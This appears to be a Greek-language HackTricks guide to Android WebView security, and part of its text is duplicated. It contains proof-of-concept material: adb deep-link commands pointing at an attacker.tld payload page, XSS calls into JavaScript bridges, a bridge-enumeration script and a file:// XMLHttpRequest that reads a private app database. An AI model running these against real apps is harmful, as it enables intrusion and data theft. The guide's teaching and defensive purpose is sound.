# Webview Attacks

{{#include ../../banners/hacktricks-training.md}}

## Οδηγός για τις Ρυθμίσεις και την Ασφάλεια του WebView

### Επισκόπηση Ευπαθειών του WebView

Ένας κρίσιμος τομέας της ανάπτυξης Android περιλαμβάνει τη σωστή διαχείριση των WebViews. Αυτός ο οδηγός επισημαίνει βασικές ρυθμίσεις και πρακτικές ασφάλειας για τη μείωση των κινδύνων που σχετίζονται με τη χρήση του WebView.

![WebView Example](<../../images/image (1190).png>)

### **Πρόσβαση σε Αρχεία στα WebViews**

Από προεπιλογή, τα WebViews επιτρέπουν την πρόσβαση σε αρχεία. Αυτή η λειτουργία ελέγχεται από τη μέθοδο `setAllowFileAccess()`, διαθέσιμη από το επίπεδο API 3 (Cupcake 1.5) του Android. Οι εφαρμογές με την άδεια **android.permission.READ_EXTERNAL_STORAGE** μπορούν να διαβάζουν αρχεία από εξωτερική αποθήκευση χρησιμοποιώντας ένα σχήμα URL αρχείου (`file://path/to/file`).

#### **Καταργημένες Λειτουργίες: Καθολική και Πρόσβαση σε Αρχεία Από URLs**

- **Καθολική Πρόσβαση Από URLs Αρχείων**: Αυτή η καταργημένη λειτουργία επέτρεπε διασυνοριακά αιτήματα από URLs αρχείων, θέτοντας σημαντικό κίνδυνο ασφάλειας λόγω πιθανών επιθέσεων XSS. Η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη (`false`) για εφαρμογές που στοχεύουν το Android Jelly Bean και νεότερες εκδόσεις.
- Για να ελέγξετε αυτή τη ρύθμιση, χρησιμοποιήστε `getAllowUniversalAccessFromFileURLs()`.
- Για να τροποποιήσετε αυτή τη ρύθμιση, χρησιμοποιήστε `setAllowUniversalAccessFromFileURLs(boolean)`.
- **Πρόσβαση σε Αρχεία Από URLs Αρχείων**: Αυτή η λειτουργία, επίσης καταργημένη, ελέγχει την πρόσβαση σε περιεχόμενο από άλλα URLs σχήματος αρχείου. Όπως και η καθολική πρόσβαση, η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη για αυξημένη ασφάλεια.
- Χρησιμοποιήστε `getAllowFileAccessFromFileURLs()` για να ελέγξετε και `setAllowFileAccessFromFileURLs(boolean)` για να ρυθμίσετε.

#### **Ασφαλής Φόρτωση Αρχείων**

Για να απενεργοποιήσετε την πρόσβαση στο σύστημα αρχείων ενώ εξακολουθείτε να έχετε πρόσβαση σε περιουσιακά στοιχεία και πόρους, χρησιμοποιείται η μέθοδος `setAllowFileAccess()`. Με το Android R και άνω, η προεπιλεγμένη ρύθμιση είναι `false`.

- Ελέγξτε με `getAllowFileAccess()`.
- Ενεργοποιήστε ή απενεργοποιήστε με `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Η κλάση **WebViewAssetLoader** είναι η σύγχρονη προσέγγιση για τη φόρτωση τοπικών αρχείων. Χρησιμοποιεί http(s) URLs για την πρόσβαση σε τοπικά περιουσιακά στοιχεία και πόρους, ευθυγραμμισμένη με την πολιτική Same-Origin, διευκολύνοντας έτσι τη διαχείριση CORS.

### loadUrl

Αυτή είναι μια κοινή λειτουργία που χρησιμοποιείται για τη φόρτωση αυθαίρετων URLs σε ένα webview:
```java
webview.loadUrl("<url here>")
```
Ofc, ένας πιθανός επιτιθέμενος δεν θα πρέπει ποτέ να μπορεί να **ελέγξει το URL** που θα φορτώσει μια εφαρμογή.

### **JavaScript και Διαχείριση Σχεδίου Intent**

- **JavaScript**: Απενεργοποιημένο από προεπιλογή σε WebViews, μπορεί να ενεργοποιηθεί μέσω του `setJavaScriptEnabled()`. Συνιστάται προσοχή καθώς η ενεργοποίηση του JavaScript χωρίς κατάλληλες προστασίες μπορεί να εισάγει ευπάθειες ασφαλείας.
- **Σχέδιο Intent**: Τα WebViews μπορούν να διαχειριστούν το σχέδιο `intent`, ενδεχομένως οδηγώντας σε εκμεταλλεύσεις αν δεν διαχειριστούν προσεκτικά. Ένα παράδειγμα ευπάθειας περιλάμβανε μια εκτεθειμένη παράμετρο WebView "support_url" που θα μπορούσε να εκμεταλλευτεί για να εκτελέσει επιθέσεις cross-site scripting (XSS).

![Vulnerable WebView](<../../images/image (1191).png>)

Παράδειγμα εκμετάλλευσης χρησιμοποιώντας adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Μια δυνατότητα παρέχεται από το Android που επιτρέπει στο **JavaScript** σε ένα WebView να καλεί **λειτουργίες εγγενών εφαρμογών Android**. Αυτό επιτυγχάνεται με τη χρήση της μεθόδου `addJavascriptInterface`, η οποία ενσωματώνει το JavaScript με τις εγγενείς λειτουργίες του Android, που ονομάζεται _WebView JavaScript bridge_. Συνιστάται προσοχή καθώς αυτή η μέθοδος επιτρέπει σε όλες τις σελίδες εντός του WebView να έχουν πρόσβαση στο καταχωρημένο αντικείμενο JavaScript Interface, θέτοντας σε κίνδυνο την ασφάλεια αν ευαίσθητες πληροφορίες εκτεθούν μέσω αυτών των διεπαφών.

- **Απαιτείται ακραία προσοχή** για εφαρμογές που στοχεύουν σε εκδόσεις Android κάτω από 4.2 λόγω μιας ευπάθειας που επιτρέπει την απομακρυσμένη εκτέλεση κώδικα μέσω κακόβουλου JavaScript, εκμεταλλευόμενη την αντανάκλαση.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** μπορούν να αλληλεπιδρούν με εγγενή κώδικα, όπως φαίνεται στα παραδείγματα όπου μια μέθοδος κλάσης εκτίθεται στο JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- Η γέφυρα JavaScript ενεργοποιείται προσθέτοντας μια διεπαφή στο WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Πιθανή εκμετάλλευση μέσω JavaScript, για παράδειγμα, μέσω μιας επίθεσης XSS, επιτρέπει την κλήση εκτεθειμένων μεθόδων Java:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Για να μετριαστούν οι κίνδυνοι, **περιορίστε τη χρήση της γέφυρας JavaScript** στον κώδικα που αποστέλλεται με το APK και αποτρέψτε τη φόρτωση JavaScript από απομακρυσμένες πηγές. Για παλαιότερες συσκευές, ορίστε το ελάχιστο επίπεδο API σε 17.

### Εκτέλεση Κώδικα μέσω Αντανάκλασης (RCE)

- Μια τεκμηριωμένη μέθοδος επιτρέπει την επίτευξη RCE μέσω αντανάκλασης εκτελώντας ένα συγκεκριμένο payload. Ωστόσο, η αναγνώριση `@JavascriptInterface` αποτρέπει την μη εξουσιοδοτημένη πρόσβαση σε μεθόδους, περιορίζοντας την επιφάνεια επίθεσης.

### Απομακρυσμένη Εντοπισμός Σφαλμάτων

- **Απομακρυσμένος εντοπισμός σφαλμάτων** είναι δυνατός με τα **Chrome Developer Tools**, επιτρέποντας την αλληλεπίδραση και την αυθαίρετη εκτέλεση JavaScript μέσα στο περιεχόμενο του WebView.

#### Ενεργοποίηση Απομακρυσμένου Εντοπισμού Σφαλμάτων

- Ο απομακρυσμένος εντοπισμός σφαλμάτων μπορεί να ενεργοποιηθεί για όλα τα WebViews εντός μιας εφαρμογής με:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Για να ενεργοποιήσετε την αποσφαλμάτωση με βάση την κατάσταση αποσφαλμάτωσης της εφαρμογής:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Εξαγωγή αυθαίρετων αρχείων

- Δείχνει την εξαγωγή αυθαίρετων αρχείων χρησιμοποιώντας ένα XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
# Webview Attacks



## Οδηγός για τις Ρυθμίσεις και την Ασφάλεια του WebView

### Επισκόπηση των Ευπαθειών του WebView

Ένας κρίσιμος τομέας της ανάπτυξης Android περιλαμβάνει τη σωστή διαχείριση των WebViews. Αυτός ο οδηγός επισημαίνει βασικές ρυθμίσεις και πρακτικές ασφάλειας για τη μείωση των κινδύνων που σχετίζονται με τη χρήση του WebView.

![WebView Example](<../../images/image (1190).png>)

### **Πρόσβαση σε Αρχεία στα WebViews**

Από προεπιλογή, τα WebViews επιτρέπουν την πρόσβαση σε αρχεία. Αυτή η λειτουργία ελέγχεται από τη μέθοδο `setAllowFileAccess()`, διαθέσιμη από το επίπεδο API 3 (Cupcake 1.5) του Android. Οι εφαρμογές με την άδεια **android.permission.READ_EXTERNAL_STORAGE** μπορούν να διαβάζουν αρχεία από εξωτερική αποθήκευση χρησιμοποιώντας ένα σχήμα URL αρχείου (`file://path/to/file`).

#### **Καταργημένες Λειτουργίες: Καθολική και Πρόσβαση σε Αρχεία Από URLs**

- **Καθολική Πρόσβαση Από URLs Αρχείων**: Αυτή η καταργημένη λειτουργία επέτρεπε διασυνοριακά αιτήματα από URLs αρχείων, θέτοντας σημαντικό κίνδυνο ασφάλειας λόγω πιθανών επιθέσεων XSS. Η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη (`false`) για εφαρμογές που στοχεύουν το Android Jelly Bean και νεότερες εκδόσεις.
- Για να ελέγξετε αυτή τη ρύθμιση, χρησιμοποιήστε `getAllowUniversalAccessFromFileURLs()`.
- Για να τροποποιήσετε αυτή τη ρύθμιση, χρησιμοποιήστε `setAllowUniversalAccessFromFileURLs(boolean)`.
- **Πρόσβαση σε Αρχεία Από URLs Αρχείων**: Αυτή η λειτουργία, επίσης καταργημένη, ελέγχει την πρόσβαση σε περιεχόμενο από άλλα URLs σχήματος αρχείου. Όπως και η καθολική πρόσβαση, η προεπιλεγμένη ρύθμιση είναι απενεργοποιημένη για αυξημένη ασφάλεια.
- Χρησιμοποιήστε `getAllowFileAccessFromFileURLs()` για έλεγχο και `setAllowFileAccessFromFileURLs(boolean)` για ρύθμιση.

#### **Ασφαλής Φόρτωση Αρχείων**

Για την απενεργοποίηση της πρόσβασης στο σύστημα αρχείων ενώ εξακολουθείτε να έχετε πρόσβαση σε περιουσιακά στοιχεία και πόρους, χρησιμοποιείται η μέθοδος `setAllowFileAccess()`. Με το Android R και άνω, η προεπιλεγμένη ρύθμιση είναι `false`.

- Ελέγξτε με `getAllowFileAccess()`.
- Ενεργοποιήστε ή απενεργοποιήστε με `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

Η κλάση **WebViewAssetLoader** είναι η σύγχρονη προσέγγιση για τη φόρτωση τοπικών αρχείων. Χρησιμοποιεί http(s) URLs για την πρόσβαση σε τοπικά περιουσιακά στοιχεία και πόρους, ευθυγραμμισμένη με την πολιτική Same-Origin, διευκολύνοντας έτσι τη διαχείριση CORS.

### loadUrl

Αυτή είναι μια κοινή λειτουργία που χρησιμοποιείται για τη φόρτωση αυθαίρετων URLs σε ένα webview:
```java
webview.loadUrl("<url here>")
```
Φυσικά, ένας πιθανός επιτιθέμενος δεν θα πρέπει ποτέ να μπορεί να **ελέγξει το URL** που θα φορτώσει μια εφαρμογή.

### Deep-linking σε εσωτερικό WebView (προσαρμοσμένο σχήμα → WebView sink)

Πολλές εφαρμογές καταχωρούν προσαρμοσμένα σχήματα/διαδρομές που δρομολογούν ένα URL που παρέχεται από τον χρήστη σε ένα WebView εντός της εφαρμογής. Εάν το deep link είναι εξαγόμενο (VIEW + BROWSABLE), ένας επιτιθέμενος μπορεί να αναγκάσει την εφαρμογή να αποδώσει αυθαίρετο απομακρυσμένο περιεχόμενο μέσα στο πλαίσιο του WebView της.

Τυπικό μοτίβο manifest (απλοποιημένο):
```xml
<activity android:name=".MainActivity" android:exported="true">
<intent-filter>
<action android:name="android.intent.action.VIEW" />
<category android:name="android.intent.category.DEFAULT" />
<category android:name="android.intent.category.BROWSABLE" />
<data android:scheme="myscheme" android:host="com.example.app" />
</intent-filter>
</activity>
```
Κοινή ροή κώδικα (απλοποιημένη):
```java
// Entry activity
@Override
protected void onNewIntent(Intent intent) {
Uri deeplink = intent.getData();
String url = deeplink.getQueryParameter("url"); // attacker-controlled
if (deeplink.getPathSegments().get(0).equals("web")) {
Intent i = new Intent(this, WebActivity.class);
i.putExtra("url", url);
startActivity(i);
}
}

// WebActivity sink
webView.loadUrl(getIntent().getStringExtra("url"));
```
Πρότυπο επίθεσης και PoC μέσω adb:
```bash
# Template – force load in internal WebView
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# If a specific Activity must be targeted
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact: η απομακρυσμένη σελίδα εκτελείται στο πλαίσιο WebView της εφαρμογής (cookies/session του προφίλ WebView της εφαρμογής, πρόσβαση σε οποιοδήποτε εκτεθειμένο @JavascriptInterface, πιθανή πρόσβαση σε content:// και file:// ανάλογα με τις ρυθμίσεις).

Hunting tips:
- Grep decompiled sources for `getQueryParameter("url")`, `loadUrl(`, `WebView` sinks, και deep-link handlers (`onCreate/onNewIntent`).
- Ελέγξτε το manifest για VIEW+BROWSABLE φίλτρα και προσαρμοσμένα schemes/hosts που αντιστοιχούν σε δραστηριότητες που αργότερα ξεκινούν ένα WebView.
- Ελέγξτε αν υπάρχουν πολλαπλές διαδρομές deep-link (π.χ., μια διαδρομή “εξωτερικού προγράμματος περιήγησης” σε σύγκριση με μια διαδρομή “εσωτερικού webview”) και προτιμήστε αυτή που αποδίδει μέσα στην εφαρμογή.

### Enabling JavaScript before verification (order-of-checks bug)

Ένα συχνό λάθος σκληρύνσεως είναι η ενεργοποίηση της JavaScript ή η ρύθμιση χαλαρών ρυθμίσεων WebView πριν ολοκληρωθεί η τελική επιτρεπόμενη λίστα/επαλήθευση της στοχευμένης διεύθυνσης URL. Εάν η επαλήθευση είναι ασυνεπής μεταξύ των βοηθητικών προγραμμάτων ή συμβαίνει πολύ αργά, ένας επιτιθέμενος deep link μπορεί να φτάσει σε κατάσταση όπου:

1) Οι ρυθμίσεις WebView εφαρμόζονται (π.χ., `setJavaScriptEnabled(true)`), και
2) Η μη αξιόπιστη διεύθυνση URL φορτώνεται με ενεργοποιημένη την JavaScript.

Bug pattern (pseudocode):
```java
// 1) Parse/early checks
Uri u = parse(intent);
if (!looksValid(u)) return;

// 2) Configure WebView BEFORE final checks
webView.getSettings().setJavaScriptEnabled(true); // BAD: too early
configureMixedContent();

// 3) Do final verification (late)
if (!finalAllowlist(u)) return; // too late – JS already enabled

// 4) Load
webView.loadUrl(u.toString());
```
Γιατί είναι εκμεταλλεύσιμο
- Ασυνεπής κανονικοποίηση: οι βοηθοί διαχωρίζουν/ανακατασκευάζουν το URL διαφορετικά από την τελική έλεγχο, δημιουργώντας ασυμφωνίες που μπορεί να εκμεταλλευτεί ένα κακόβουλο URL.
- Λανθασμένη σειρά διαδικασίας: η ενεργοποίηση JS στο βήμα 2 εφαρμόζεται παγκοσμίως στην περίπτωση WebView, επηρεάζοντας τη τελική φόρτωση ακόμη και αν η επαλήθευση αποτύχει αργότερα.

Πώς να δοκιμάσετε
- Δημιουργήστε payloads deep-link που περνούν τους πρώτους ελέγχους και φτάνουν στην ιστοσελίδα διαμόρφωσης WebView.
- Χρησιμοποιήστε adb για να εκτοξεύσετε έμμεσες προθέσεις VIEW παραδίδοντας μια παράμετρο `url=` που ελέγχετε εσείς:
```bash
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Αν η εκμετάλλευση είναι επιτυχής, το payload σας εκτελεί JavaScript στο WebView της εφαρμογής. Από εκεί, ερευνήστε για εκτεθειμένες γέφυρες:
```html
<script>
for (let k in window) {
try { if (typeof window[k] === 'object' || typeof window[k] === 'function') console.log('[JSI]', k); } catch(e){}
}
</script>
```
Αμυντική καθοδήγηση
- Κανονικοποιήστε μία φορά; επικυρώστε αυστηρά έναντι μιας μόνο πηγής αλήθειας (σχέδιο/οικοδεσπότης/μονοπάτι/ερώτημα).
- Καλέστε μόνο `setJavaScriptEnabled(true)` αφού περάσουν όλοι οι έλεγχοι επιτρεπόμενης λίστας και ακριβώς πριν από τη φόρτωση αξιόπιστου περιεχομένου.
- Αποφύγετε την έκθεση του `@JavascriptInterface` σε μη αξιόπιστες προελεύσεις; προτιμήστε τον έλεγχο ανά προέλευση.
- Σκεφτείτε τις περιπτώσεις ανά WebView για αξιόπιστο και μη αξιόπιστο περιεχόμενο, με το JS απενεργοποιημένο από προεπιλογή.

### **Διαχείριση JavaScript και Σχεδίου Intent**

- **JavaScript**: Απενεργοποιημένο από προεπιλογή σε WebViews, μπορεί να ενεργοποιηθεί μέσω του `setJavaScriptEnabled()`. Συνιστάται προσοχή καθώς η ενεργοποίηση του JavaScript χωρίς κατάλληλες προστασίες μπορεί να εισαγάγει ευπάθειες ασφαλείας.
- **Σχέδιο Intent**: Οι WebViews μπορούν να χειριστούν το σχέδιο `intent`, ενδεχομένως οδηγώντας σε εκμεταλλεύσεις αν δεν διαχειριστούν προσεκτικά. Ένα παράδειγμα ευπάθειας περιλάμβανε μια εκτεθειμένη παράμετρο WebView "support_url" που θα μπορούσε να εκμεταλλευτεί για την εκτέλεση επιθέσεων cross-site scripting (XSS).

![Vulnerable WebView](<../../images/image (1191).png>)

Παράδειγμα εκμετάλλευσης χρησιμοποιώντας adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView –es support_url "https://example.com/xss.html"
```
### Javascript Bridge

Μια δυνατότητα παρέχεται από το Android που επιτρέπει στο **JavaScript** σε ένα WebView να καλεί **λειτουργίες εγγενών εφαρμογών Android**. Αυτό επιτυγχάνεται με τη χρήση της μεθόδου `addJavascriptInterface`, η οποία ενσωματώνει το JavaScript με τις εγγενείς λειτουργίες του Android, που ονομάζεται _WebView JavaScript bridge_. Συνιστάται προσοχή καθώς αυτή η μέθοδος επιτρέπει σε όλες τις σελίδες εντός του WebView να έχουν πρόσβαση στο καταχωρημένο αντικείμενο JavaScript Interface, θέτοντας σε κίνδυνο την ασφάλεια αν ευαίσθητες πληροφορίες εκτεθούν μέσω αυτών των διεπαφών.

- **Απαιτείται ακραία προσοχή** για εφαρμογές που στοχεύουν σε εκδόσεις Android κάτω από 4.2 λόγω μιας ευπάθειας που επιτρέπει την απομακρυσμένη εκτέλεση κώδικα μέσω κακόβουλου JavaScript, εκμεταλλευόμενη την αντανάκλαση.

#### Implementing a JavaScript Bridge

- **JavaScript interfaces** μπορούν να αλληλεπιδρούν με εγγενή κώδικα, όπως φαίνεται στα παραδείγματα όπου μια μέθοδος κλάσης εκτίθεται στο JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- Η γέφυρα JavaScript ενεργοποιείται προσθέτοντας μια διεπαφή στο WebView:
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge")
webView.reload()
```
- Πιθανή εκμετάλλευση μέσω JavaScript, για παράδειγμα, μέσω μιας επίθεσης XSS, επιτρέπει την κλήση εκτεθειμένων μεθόδων Java:
```html
<script>
alert(javascriptBridge.getSecret())
</script>
```
- Για να μετριαστούν οι κίνδυνοι, **περιορίστε τη χρήση της γέφυρας JavaScript** στον κώδικα που αποστέλλεται με το APK και αποτρέψτε τη φόρτωση JavaScript από απομακρυσμένες πηγές. Για παλαιότερες συσκευές, ορίστε το ελάχιστο επίπεδο API σε 17.

### Εκτέλεση Κώδικα μέσω Αντανάκλασης (RCE)

- Μια τεκμηριωμένη μέθοδος επιτρέπει την επίτευξη RCE μέσω αντανάκλασης εκτελώντας ένα συγκεκριμένο payload. Ωστόσο, η αναγνώριση `@JavascriptInterface` αποτρέπει την μη εξουσιοδοτημένη πρόσβαση σε μεθόδους, περιορίζοντας την επιφάνεια επίθεσης.

### Απομακρυσμένος Εντοπισμός Σφαλμάτων

- **Απομακρυσμένος εντοπισμός σφαλμάτων** είναι δυνατός με τα **Chrome Developer Tools**, επιτρέποντας την αλληλεπίδραση και την αυθαίρετη εκτέλεση JavaScript μέσα στο περιεχόμενο του WebView.

#### Ενεργοποίηση Απομακρυσμένου Εντοπισμού Σφαλμάτων

- Ο απομακρυσμένος εντοπισμός σφαλμάτων μπορεί να ενεργοποιηθεί για όλα τα WebViews εντός μιας εφαρμογής με:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Για να ενεργοποιήσετε την αποσφαλμάτωση με βάση την κατάσταση αποσφαλμάτωσης της εφαρμογής:
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Εξαγωγή αυθαίρετων αρχείων

- Δείχνει την εξαγωγή αυθαίρετων αρχείων χρησιμοποιώντας ένα XMLHttpRequest:
```javascript
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText)
}
}
xhr.open(
"GET",
"file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db",
true
)
xhr.send(null)
```
## Αναφορές

- [Review of Android WebViews file access attack vectors](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [WheresMyBrowser.Android (demo app)](https://github.com/authenticationfailure/WheresMyBrowser.Android)
- [Android WebView reference](https://developer.android.com/reference/android/webkit/WebView)
- [Deep Links & WebViews Exploitations – Part II](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
- [Deep Links & WebViews Exploitations – Part I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)

{{#include ../../banners/hacktricks-training.md}}
